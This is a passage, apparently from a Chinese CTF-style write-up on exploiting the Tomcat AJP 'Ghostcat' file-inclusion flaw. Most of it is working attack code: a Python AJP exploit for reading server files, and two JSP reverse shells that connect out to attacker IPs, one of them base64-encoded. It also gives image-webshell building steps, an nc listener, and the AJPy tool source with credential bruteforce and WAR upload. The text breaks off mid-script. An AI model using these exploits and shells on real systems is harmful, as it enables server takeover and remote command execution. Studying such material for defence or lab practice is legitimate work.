&quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;, &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]\tdef __init__(self, data_direction=None):\t\tself.prefix_code = 0x02\t\tself.method = None\t\tself.protocol = None\t\tself.req_uri = None\t\tself.remote_addr = None\t\tself.remote_host = None\t\tself.server_name = None\t\tself.server_port = None\t\tself.is_ssl = None\t\tself.num_headers = None\t\tself.request_headers = None\t\tself.attributes = None\t\tself.data_direction = data_direction\tdef pack_headers(self):\t\tself.num_headers = len(self.request_headers)\t\tres = &quot;&quot;\t\tres = struct.pack(&quot;&gt;h&quot;, self.num_headers)\t\tfor h_name in self.request_headers:\t\t\tif h_name.startswith(&quot;SC_REQ&quot;):\t\t\t\tcode = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1\t\t\t\tres += struct.pack(&quot;BB&quot;, 0xA0, code)\t\t\telse:\t\t\t\tres += pack_string(h_name)\t\t\tres += pack_string(self.request_headers[h_name])\t\treturn res\tdef pack_attributes(self):\t\tres = b&quot;&quot;\t\tfor attr in self.attributes:\t\t\ta_name = attr[&#x27;name&#x27;]\t\t\tcode = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1\t\t\tres += struct.pack(&quot;b&quot;, code)\t\t\tif a_name == &quot;req_attribute&quot;:\t\t\t\taa_name, a_value = attr[&#x27;value&#x27;]\t\t\t\tres += pack_string(aa_name)\t\t\t\tres += pack_string(a_value)\t\t\telse:\t\t\t\tres += pack_string(attr[&#x27;value&#x27;])\t\tres += struct.pack(&quot;B&quot;, 0xFF)\t\treturn res\tdef serialize(self):\t\tres = &quot;&quot;\t\tres = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)\t\tres += pack_string(self.protocol)\t\tres += pack_string(self.req_uri)\t\tres += pack_string(self.remote_addr)\t\tres += pack_string(self.remote_host)\t\tres += pack_string(self.server_name)\t\tres += struct.pack(&quot;&gt;h&quot;, self.server_port)\t\tres += struct.pack(&quot;?&quot;, self.is_ssl)\t\tres += self.pack_headers()\t\tres += self.pack_attributes()\t\tif self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:\t\t\theader = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))\t\telse:\t\t\theader = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))\t\treturn header + res\tdef parse(self, raw_packet):\t\tstream = StringIO(raw_packet)\t\tself.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)\t\tself.prefix_code, self.method = unpack(stream, &quot;bb&quot;)\t\tself.protocol = unpack_string(stream)\t\tself.req_uri = unpack_string(stream)\t\tself.remote_addr = unpack_string(stream)\t\tself.remote_host = unpack_string(stream)\t\tself.server_name = unpack_string(stream)\t\tself.server_port = unpack(stream, &quot;&gt;h&quot;)\t\tself.is_ssl = unpack(stream, &quot;?&quot;)\t\tself.num_headers, = unpack(stream, &quot;&gt;H&quot;)\t\tself.request_headers = &#123;&#125;\t\tfor i in range(self.num_headers):\t\t\tcode, = unpack(stream, &quot;&gt;H&quot;)\t\t\tif code &gt; 0xA000:\t\t\t\th_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]\t\t\telse:\t\t\t\th_name = unpack(stream, &quot;%ds&quot; % code)\t\t\t\tstream.read(1) # \\0\t\t\th_value = unpack_string(stream)\t\t\tself.request_headers[h_name] = h_value\tdef send_and_receive(self, socket, stream, save_cookies=False):\t\tres = []\t\ti = socket.sendall(self.serialize())\t\tif self.method == AjpForwardRequest.POST:\t\t\treturn res\t\tr = AjpResponse.receive(stream)\t\tassert r.prefix_code == AjpResponse.SEND_HEADERS\t\tres.append(r)\t\tif save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:\t\t\tself.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]\t\t# read body chunks and end response packets\t\twhile True:\t\t\tr = AjpResponse.receive(stream)\t\t\tres.append(r)\t\t\tif r.prefix_code == AjpResponse.END_RESPONSE:\t\t\t\tbreak\t\t\telif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:\t\t\t\tcontinue\t\t\telse:\t\t\t\traise NotImplementedError\t\t\t\tbreak\t\treturn resclass AjpResponse(object):\t_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\tCOMMON_SEND_HEADERS = [\t\t\t&quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,\t\t\t&quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;\t\t\t]\tdef parse(self, stream):\t\t# read headers\t\tself.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)\t\tif self.prefix_code == AjpResponse.SEND_HEADERS:\t\t\tself.parse_send_headers(stream)\t\telif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\t\t\tself.parse_send_body_chunk(stream)\t\telif self.prefix_code == AjpResponse.END_RESPONSE:\t\t\tself.parse_end_response(stream)\t\telif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\t\t\tself.parse_get_body_chunk(stream)\t\telse:\t\t\traise NotImplementedError\tdef parse_send_headers(self, stream):\t\tself.http_status_code, = unpack(stream, &quot;&gt;H&quot;)\t\tself.http_status_msg = unpack_string(stream)\t\tself.num_headers, = unpack(stream, &quot;&gt;H&quot;)\t\tself.response_headers = &#123;&#125;\t\tfor i in range(self.num_headers):\t\t\tcode, = unpack(stream, &quot;&gt;H&quot;)\t\t\tif code &lt;= 0xA000: # custom header\t\t\t\th_name, = unpack(stream, &quot;%ds&quot; % code)\t\t\t\tstream.read(1) # \\0\t\t\t\th_value = unpack_string(stream)\t\t\telse:\t\t\t\th_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]\t\t\t\th_value = unpack_string(stream)\t\t\tself.response_headers[h_name] = h_value\tdef parse_send_body_chunk(self, stream):\t\tself.data_length, = unpack(stream, &quot;&gt;H&quot;)\t\tself.data = stream.read(self.data_length+1)\tdef parse_end_response(self, stream):\t\tself.reuse, = unpack(stream, &quot;b&quot;)\tdef parse_get_body_chunk(self, stream):\t\trlen, = unpack(stream, &quot;&gt;H&quot;)\t\treturn rlen\t@staticmethod\tdef receive(stream):\t\tr = AjpResponse()\t\tr.parse(stream)\t\treturn rimport socketdef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\tfr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\tfr.method = method\tfr.protocol = &quot;HTTP/1.1&quot;\tfr.req_uri = req_uri\tfr.remote_addr = target_host\tfr.remote_host = None\tfr.server_name = target_host\tfr.server_port = 80\tfr.request_headers = &#123;\t\t&#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,\t\t&#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,\t\t&#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,\t\t&#x27;SC_REQ_HOST&#x27;: target_host,\t\t&#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,\t\t&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,\t\t&#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,\t\t&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,\t\t&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;\t&#125;\tfr.is_ssl = False\tfr.attributes = []\treturn frclass Tomcat(object):\tdef __init__(self, target_host, target_port):\t\tself.target_host = target_host\t\tself.target_port = target_port\t\tself.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\t\tself.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\t\tself.socket.connect((target_host, target_port))\t\tself.stream = self.socket.makefile(&quot;rb&quot;, bufsize=0)\tdef perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):\t\tself.req_uri = req_uri\t\tself.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\t\tprint(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))\t\tif user is not None and password is not None:\t\t\tself.forward_request.request_headers[&#x27;SC_REQ_AUTHORIZATION&#x27;] = &quot;Basic &quot; + (&quot;%s:%s&quot; % (user, password)).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)\t\tfor h in headers:\t\t\tself.forward_request.request_headers[h] = headers[h]\t\tfor a in attributes:\t\t\tself.forward_request.attributes.append(a)\t\tresponses = self.forward_request.send_and_receive(self.socket, self.stream)\t\tif len(responses) == 0:\t\t\treturn None, None\t\tsnd_hdrs_res = responses[0]\t\tdata_res = responses[1:-1]\t\tif len(data_res) == 0:\t\t\tprint(&quot;No data in response. Headers:%s\\n&quot; % snd_hdrs_res.response_headers)\t\treturn snd_hdrs_res, data_res&#x27;&#x27;&#x27;javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path&#x27;&#x27;&#x27;import argparseparser = argparse.ArgumentParser()parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)args = parser.parse_args()t = Tomcat(args.target, args.port)_,data = t.perform_request(&#x27;/whalwl/asdf&#x27;,attributes=[    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.request_uri&#x27;,&#x27;/&#x27;]&#125;,    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.path_info&#x27;,args.file]&#125;,    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.servlet_path&#x27;,&#x27;/&#x27;]&#125;,    ])print(&#x27;----------------------------&#x27;)print(&quot;&quot;.join([d.data for d in data]))\n\n\n0b100 getshell(一)\n反弹shell一（推荐）：\n&lt;%java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NS4xMzAvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);%&gt;\n\n反弹shell二：\n# msf生成，具体生成下文已给出msfvenom -p java/jsp_shell_reverse_tcp LHOST=43.138.193.108 LPORT=4445 R &gt;shell.jsp\n&lt;%@page import=&quot;java.lang.*&quot;%&gt;&lt;%@page import=&quot;java.util.*&quot;%&gt;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;java.net.*&quot;%&gt;&lt;%  class StreamConnector extends Thread  &#123;    InputStream sG;    OutputStream p2;    StreamConnector( InputStream sG, OutputStream p2 )    &#123;      this.sG = sG;      this.p2 = p2;    &#125;    public void run()    &#123;      BufferedReader rB  = null;      BufferedWriter xij = null;      try      &#123;        rB  = new BufferedReader( new InputStreamReader( this.sG ) );        xij = new BufferedWriter( new OutputStreamWriter( this.p2 ) );        char buffer[] = new char[8192];        int length;        while( ( length = rB.read( buffer, 0, buffer.length ) ) &gt; 0 )        &#123;          xij.write( buffer, 0, length );          xij.flush();        &#125;      &#125; catch( Exception e )&#123;&#125;      try      &#123;        if( rB != null )          rB.close();        if( xij != null )          xij.close();      &#125; catch( Exception e )&#123;&#125;    &#125;  &#125;  try  &#123;    String ShellPath;if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123;  ShellPath = new String(&quot;/bin/sh&quot;);&#125; else &#123;  ShellPath = new String(&quot;cmd.exe&quot;);&#125;    Socket socket = new Socket( &quot;192.168.255.130&quot;, 4444 );    Process process = Runtime.getRuntime().exec( ShellPath );    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  &#125; catch( Exception e ) &#123;&#125;%&gt;\n\n构造图片马后上传\n# Windows平台：&quot;合并.bat&quot;copy img.jpg/b + shell.jsp/a shell.jpg# 传入的图片马http://106.15.50.112:18080/whalwl/upload/2022-000047-000027.jpgflag&#123;a3f961e96e9706f21cf44a8b91822f94&#125;\n\n\n\n文件包含# 远程服务器监听端口，此处使用ncnc -lvvnp 4444# 基于前面修改的代码继续修改# CNVD-2020-10487-Tomcat-Ajp-lfi.py 的 296行：# _,data = t.perform_request(&#x27;/whalwl/asdf&#x27;,attributes=[# 修改为# _,data = t.perform_request(&#x27;/whalwl/asdf.jsp&#x27;,attributes=[# 利用脚本实现文件包含以读取文件python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 106.15.50.112 -p 18009 -f upload/2022-000047-000027.jpg\n\n\n0b101 getshell(二)\n使用脚本：https://github.com/hypn0s/AJPy# 更简单，不用总修改代码# 读 /WEB-INF/web.xmlpython3 tomcat.py --port 18009 read_file --webapp=whalwl /WEB-INF/web.xml 106.15.50.112# 读图片马，反弹shellpython3 tomcat.py --port 18009 read_file --webapp=whalwl /upload/2022-000047-000027.jpg 106.15.50.11\n\n\n#!/usr/bin/env python## Julien Legras - Synacktiv## THIS SOFTWARE IS PROVIDED BY SYNACKTIV &#x27;&#x27;AS IS&#x27;&#x27; AND ANY# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE# DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundExceptionfrom pprint import pprint, pformatfrom base64 import b64encodeimport socketimport argparseimport loggingimport reimport osimport loggingimport systry:\tfrom urllib import unquoteexcept ImportError:\tfrom urllib.parse import unquotedef setup_logger():\tlogger = logging.getLogger(&#x27;meow&#x27;)\thandler = logging.StreamHandler()\tlogger.addHandler(handler)\tlogger.setLevel(logging.DEBUG)\treturn loggerlogger = setup_logger()# helpersdef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\tfr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\tfr.method = method\tfr.protocol = &quot;HTTP/1.1&quot;\tfr.req_uri = req_uri\tfr.remote_addr = target_host\tfr.remote_host = None\tfr.server_name = target_host\tfr.server_port = 80\tfr.request_headers = &#123;\t\t&#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,\t\t&#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,\t\t&#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,\t\t&#x27;SC_REQ_HOST&#x27;: target_host,\t\t&#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0&#x27;,\t\t&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,\t\t&#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,\t\t&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,\t\t&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;\t&#125;\tfr.is_ssl = False\tfr.attributes = []\treturn frclass Tomcat(object):\tdef __init__(self, target_host, target_port):\t\tself.target_host = target_host\t\tself.target_port = target_port\t\tself.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\t\tself.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\t\tself.socket.connect((target_host, target_port))\t\tself.stream = self.socket.makefile(&quot;rb&quot;)\tdef test_password(self, user, password):\t\tres = False\t\tstop = False\t\tcreds = b64encode((&quot;%s:%s&quot; % (user, password)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)\t\tself.forward_request.request_headers[&#x27;SC_REQ_AUTHORIZATION&#x27;] = &quot;Basic &quot; + creds\t\twhile not stop:\t\t\tlogger.debug(&quot;testing %s:%s&quot; % (user, password))\t\t\tresponses = self.forward_request.send_and_receive(self.socket, self.stream)\t\t\tsnd_hdrs_res = responses[0]\t\t\tif snd_hdrs_res.http_status_code == 404:\t\t\t\traise NotFoundException(&quot;The req_uri %s does not exist!&quot; % self.req_uri)\t\t\telif snd_hdrs_res.http_status_code == 302:\t\t\t\tself.req_uri = snd_hdrs_res.response_headers.get(&#x27;Location&#x27;, &#x27;&#x27;)\t\t\t\tlogger.info(&quot;Redirecting to %s&quot; % self.req_uri)\t\t\t\tself.forward_request.req_uri = self.req_uri\t\t\telif snd_hdrs_res.http_status_code == 200:\t\t\t\tlogger.info(&quot;Found valid credz: %s:%s&quot; % (user, password))\t\t\t\tres = True\t\t\t\tstop = True\t\t\t\tif &#x27;Set-Cookie&#x27; in snd_hdrs_res.response_headers:\t\t\t\t\tlogger.info(&quot;Here is your cookie: %s&quot; % (snd_hdrs_res.response_headers.get(&#x27;Set-Cookie&#x27;, &#x27;&#x27;)))\t\t\telif snd_hdrs_res.http_status_code == 403:\t\t\t\tlogger.info(&quot;Found valid credz: %s:%s but the user is not authorized to access this resource&quot; % (user, password))\t\t\t\tstop = True\t\t\telif snd_hdrs_res.http_status_code == 401:\t\t\t\tstop = True\t\treturn res\tdef start_bruteforce(self, users, passwords, req_uri, autostop):\t\tlogger.info(&quot;Attacking a tomcat at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))\t\tself.req_uri = req_uri\t\tself.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri) \t \t\tf_users = open(users, &quot;r&quot;)\t\tf_passwords = open(passwords, &quot;r&quot;)\t\tvalid_credz = []\t\ttry:\t\t\tfor user in f_users:\t\t\t\tf_passwords.seek(0, 0)\t\t\t\tfor password in f_passwords:\t\t\t\t\tif autostop and len(valid_credz) &gt; 0:\t\t\t\t\t\tself.socket.close()\t\t\t\t\t\treturn valid_credz\t\t\t\t\tuser = user.rstrip(&#x27;\\n&#x27;)\t\t\t\t\tpassword = password.rstrip(&#x27;\\n&#x27;)\t\t\t\t\tif self.test_password(user, password):\t\t\t\t\t\tvalid_credz.append((user, password))\t\texcept NotFoundException as e:\t\t\tlogger.fatal(e.message)\t\tfinally:\t\t\tlogger.debug(&quot;Closing socket...&quot;)\t\t\tself.socket.close()\t\t\treturn valid_credz\tdef perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):\t\tself.req_uri = req_uri\t\tself.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\t\tlogger.debug(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))\t\tif user is not None and password is not None:\t\t\tcreds = b64encode((&quot;%s:%s&quot; % (user, password)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)\t\t\tself.forward_request.request_headers[&#x27;SC_REQ_AUTHORIZATION&#x27;] = &quot;Basic &quot; + creds\t\tfor h in headers:\t\t\tself.forward_request.request_headers[h] = headers[h]\t\tfor a in attributes:\t\t\tself.forward_request.attributes.append(a)\t\tresponses = self.forward_request.send_and_receive(self.socket, self.stream)\t\tif len(responses) == 0:\t\t\treturn None, None\t\tsnd_hdrs_res = responses[0]\t\tdata_res = responses[1:-1]\t\tif len(data_res) == 0:\t\t\tlogger.info(&quot;No data in response. Headers:\\n %s&quot; % pformat(vars(snd_hdrs_res)))\t\treturn snd_hdrs_res, data_res\tdef upload(self, filename, user, password, old_version, headers=&#123;&#125;):\t\tdeploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)\t\twith open(filename, &quot;rb&quot;) as f_input:\t\t\twith open(&quot;/tmp/request&quot;, &quot;w+b&quot;) as f:\t\t\t\ts_form_header = &#x27;------WebKitFormBoundaryb2qpuwMoVtQJENti\\r\\nContent-Disposition: form-data; name=&quot;deployWar&quot;; filename=&quot;%s&quot;\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n&#x27; % os.path.basename(filename)\t\t\t\ts_form_footer = &#x27;\\r\\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\\r\\n&#x27;\t\t\t\tf.write(s_form_header.encode(&#x27;utf-8&#x27;))\t\t\t\tf.write(f_input.read())\t\t\t\tf.write(s_form_footer.encode(&#x27;utf-8&#x27;))\t\tdata_len = os.path.getsize(&quot;/tmp/request&quot;)\t\theaders = &#123;\t\t\t\t&quot;SC_REQ_CONTENT_TYPE&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti&quot;,\t\t\t\t&quot;SC_REQ_CONTENT_LENGTH&quot;: &quot;%d&quot; % data_len,\t\t\t\t&quot;SC_REQ_REFERER&quot;: &quot;http://%s/manager/html/&quot; % (self.target_host),\t\t\t\t&quot;Origin&quot;: &quot;http://%s&quot; % (self.target_host),\t\t&#125;\t\tif obj_cookie is not None:\t\t\theaders[&quot;SC_REQ_COOKIE&quot;] = obj_cookie.group(&#x27;cookie&#x27;)\t\tattributes = [&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;JK_LB_ACTIVATION&quot;, &quot;ACT&quot;)&#125;, &#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;AJP_REMOTE_PORT&quot;, &quot;12345&quot;)&#125;]\t\tif old_version == False:\t\t\tattributes.append(&#123;&quot;name&quot;: &quot;query_string&quot;, &quot;value&quot;: deploy_csrf_token&#125;)\t\told_apps = self.list_installed_applications(user, password, old_version)\t\tr = self.perform_request(&quot;/manager/html/upload&quot;, headers=headers, method=&quot;POST&quot;, user=user, password=password, attributes=attributes)\t\twith open(&quot;/tmp/request&quot;, &quot;rb&quot;) as f:\t\t\tbr = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)\t\t\tbr.send_and_receive(self.socket, self.stream)\t\tr = AjpResponse.receive(self.stream)\t\tif r.prefix_code == AjpResponse.END_RESPONSE:\t\t\tlogger.error(&#x27;Upload failed&#x27;)\t\twhile r.prefix_code != AjpResponse.END_RESPONSE:\t\t\tr = AjpResponse.receive(self.stream)\t\tlogger.debug(&#x27;Upload seems normal. Checking...&#x27;)\t\tnew_apps = self.list_installed_applications(user, password, old_version)\t\tif len(new_apps) == len(old_apps) + 1:\t\t\tlogger.info(&#x27;Upload success!&#x27;)\t\telse:\t\t\tlogger.error(&#x27;Upload failed&#x27;)\tdef get_error_page(self):\t\treturn self.perform_request(&quot;/blablablablabla&quot;)\tdef get_version(self):\t\thdrs, data = self.get_error_page()\t\tfor d in data:\t\t\ts = re.findall(&#x27;(Apache Tomcat/[0-9\\.]+)&#x27;, d.data.decode(&#x27;utf-8&#x27;))\t\t\tif len(s) &gt; 0:\t\t\t\treturn s[0]\tdef get_csrf_token(self, user, password, old_version, headers=&#123;&#125;, query=[]):\t\t# first we request the manager page to get the CSRF token\t\thdrs, rdata = self.perform_request(&quot;/manager/html&quot;, headers=headers, user=user, password=password)\t\tdeploy_csrf_token = re.findall(&#x27;(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)&quot;&#x27;, &quot;&quot;.join([d.data.decode(&#x27;utf8&#x27;) for d in rdata]))\t\tif old_version == False:\t\t\tif len(deploy_csrf_token) == 0:\t\t\t\tlogger.critical(&quot;Failed to get CSRF token. Check the credentials&quot;)\t\t\t\treturn\t\t\tlogger.debug(&#x27;CSRF token = %s&#x27; % deploy_csrf_token[0])\t\tobj = re.match(&quot;(?P&lt;cookie&gt;JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly&quot;, hdrs.response_headers.get(&#x27;Set-Cookie&#x27;, &#x27;&#x27;).decode(&#x27;utf-8&#x27;))\t\tif obj is not None:\t\t\treturn deploy_csrf_token[0], obj\t\treturn deploy_csrf_token[0], None\tdef list_installed_applications(self, user, password, old_version, headers=&#123;&#125;):\t\tdeploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)\t\theaders = &#123;\t\t\t\t&quot;SC_REQ_CONTENT_TYPE&quot;: &quot;application/x-www-form-urlencoded&quot;,\t\t\t\t&quot;SC_REQ_CONTENT_LENGTH&quot;: &quot;0&quot;,\t\t\t\t&quot;SC_REQ_REFERER&quot;: &quot;http://%s/manager/html/&quot; % (self.target_host),\t\t\t\t&quot;Origin&quot;: &quot;http://%s&quot; % (self.target_host),\t\t&#125;\t\tif obj_cookie is not None:\t\t\theaders[&quot;SC_REQ_COOKIE&quot;] = obj_cookie.group(&#x27;cookie&#x27;)\t\tattributes = [&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;JK_LB_ACTIVATION&quot;, &quot;ACT&quot;)&#125;,\t\t\t&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;AJP_REMOTE_PORT&quot;, &quot;&#123;&#125;&quot;.format(self.socket.getsockname()[1]))&#125;]\t\tif old_version == False:\t\t\tattributes.append(&#123;\t\t\t&quot;name&quot;: &quot;query_string&quot;, &quot;value&quot;: &quot;%s&quot; % deploy_csrf_token&#125;)\t\thdrs, data = self.perform_request(&quot;/manager/html/&quot;, headers=headers, method=&quot;GET&quot;, user=user, password=password, attributes=attributes)\t\tfound = []\t\tfor d in data:\t\t\tim = re.findall(&#x27;&lt;small&gt;&lt;a href=&quot;([^&quot;;]*)&quot;&gt;&#x27;, d.data.decode(&#x27;utf8&#x27;))\t\t\tfor app in im:\t\t\t\tfound.append(unquote(app))\t\treturn found\tdef undeploy(self, path, user, password, old_version, headers=&#123;&#125;):\t\tdeploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)\t\tpath_app = &quot;path=%s&quot; % path\t\theaders = &#123;\t\t\t\t&quot;SC_REQ_CONTENT_TYPE&quot;: &quot;application/x-www-form-urlencoded&quot;,\t\t\t\t&quot;SC_REQ_CONTENT_LENGTH&quot;: &quot;0&quot;,\t\t\t\t&quot;SC_REQ_REFERER&quot;: &quot;http://%s/manager/html/&quot; % (self.target_host),\t\t\t\t&quot;Origin&quot;: &quot;http://%s&quot; % (self.target_host),\t\t&#125;\t\tif obj_cookie is not None:\t\t\theaders[&quot;SC_REQ_COOKIE&quot;] = obj_cookie.group(&#x27;cookie&#x27;)\t\tattributes = [&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;JK_LB_ACTIVATION&quot;, &quot;ACT&quot;)&#125;,\t\t\t&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;AJP_REMOTE_PORT&quot;, &quot;&#123;&#125;&quot;.format(self.socket.getsockname()[1]))&#125;]\t\tif old_version == False:\t\t\tattributes.append(&#123;\t\t\t&quot;name&quot;: &quot;query_string&quot;, &quot;value&quot;: &quot;%s&amp;%s&quot; % (path_app, deploy_csrf_token)&#125;)\t\tr = self.perform_request(&quot;/manager/html/undeploy&quot;, headers=headers, method=&quot;POST&quot;, user=user, password=password, attributes=attributes)\t\tr = AjpResponse.receive(self.stream)\t\tif r.prefix_code == AjpResponse.END_RESPONSE:\t\t\tlogger.error(&#x27;Undeploy failed&#x27;)\t\t# Check the successful message\t\tfound = False\t\tregex = r&#x27;&lt;small&gt;&lt;strong&gt;Message:&lt;\\/strong&gt;&lt;\\/small&gt;&amp;nbsp;&lt;\\/td&gt;\\s*&lt;td class=&quot;row-left&quot;&gt;&lt;pre&gt;(OK - .*&#x27;+path+&#x27;)\\s*&lt;\\/pre&gt;&lt;\\/td&gt;&#x27;\t\twhile r.prefix_code != AjpResponse.END_RESPONSE:\t\t\tr = AjpResponse.receive(self.stream)\t\t\tif r.prefix_code == 3:\t\t\t\tf = re.findall(regex, r.data.decode(&#x27;utf-8&#x27;))\t\t\t\tif len(f) &gt; 0:\t\t\t\t\tfound = True\t\tif found:\t\t\tlogger.info(&#x27;Undeploy succeed&#x27;)\t\telse:\t\t\tlogger.error(&#x27;Undeploy failed&#x27;)if __name__ == &quot;__main__&quot;:\tparser = argparse.ArgumentParser()\tsubparsers = 